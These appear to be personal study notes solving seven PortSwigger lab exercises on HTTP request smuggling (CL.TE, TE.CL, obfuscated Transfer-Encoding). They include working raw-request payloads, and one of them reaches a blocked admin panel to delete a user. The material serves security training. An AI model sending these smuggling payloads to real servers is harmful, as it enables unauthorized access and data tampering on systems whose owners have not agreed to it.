![[Pasted image 20250915161953.png]]
### 1. Lab: HTTP request smuggling, basic CL.TE vulnerability
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.
To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

In order to go `GPOST` request, we will use the last character `G` and will send POST request again.
```
POST / HTTP/2
Host: 0a060025042e090b84fba5de0018000f.web-security-academy.net
...
Transfer-Encoding: chunked
Content-Length: 8

0

G
```
![[Pasted image 20250913103822.png]]
Send second request with similar things,
![[Pasted image 20250913103842.png]]
It will say `"Unrecognized method GPOST"`
### 2. Lab: HTTP request smuggling, basic TE.CL vulnerability
> This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.
To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

This application is processing Transfer Encoding in Frontend and Content Length in backend, so we will use Transfer Encoding 60 bytes to send the request with GPOST from frontend and will give Content Length 4 bytes so that the backend will consider `60\r\n` (4 bytes) and the next request will be smuggled.
```
POST / HTTP/1.1
Host: 0aae001e039d93688179842000930063.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

60
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

foo=bar
0
```
![[Pasted image 20250913112221.png]]
![[Pasted image 20250913112233.png]]
### 3. Lab: HTTP request smuggling, obfuscating the TE header
> This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.
To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

### 4. Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.


This application is vulnerable to CL. TE vulnerability, so we will send the content length of entire request and will use transfer encoding chunked with `0`, meaning, the request is terminated and it will start next request with `GET /404` now. 
```
POST / HTTP/1.1
Host: 0a17000a0388077882df5851000f0007.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-foo: X
```
![[Pasted image 20250915165628.png]]
After sending chunked request now if we send normal request then it will append this request with the previous 404 request.
```
POST / HTTP/1.1
Host: 0a17000a0388077882df5851000f0007.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

foo=bar
```
The next request will be something like this
```
GET /404 HTTP/1.1
X-Foo: xPOST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded Content-Length: 11
...
```
### 5. Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
> This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.
To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.

This application is vulnerable to TE. CL request smuggling. The frontend will chunk request and the backend will think that the request will be over after `4` bytes. The next request will be considered as the new request.
```
POST / HTTP/1.1
Host: 0aaa00e004f9095c8083bcaa0027004a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
![[Pasted image 20250915171756.png]]
Next, we will send normal GET request and we will see that it will return `404`.
![[Pasted image 20250915171803.png]]
### 6. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.
To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

In order to send admin request with CL. TE we will use this request
![[Pasted image 20250915173700.png]]
But when we send normal GET request, it will say `Admin interface only available to local users`.
![[Pasted image 20250915173731.png]]
If we add `Host: localhost` in header, we will see duplicate header error. The request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request. So instead of adding another host, we will send the new request as the body of the admin request and it will show admin panel.
![[Pasted image 20250915174231.png]]
Now if we send the normal GET request, it will delete carlos user.
### 7. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
> This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.
To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

This has similar logic as before. The only difference is CL. TE to TE. CL
```
POST / HTTP/1.1
Host: 0a6e00a00447cfce831af14e00d600f1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

88
POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
![[Pasted image 20250915181653.png]]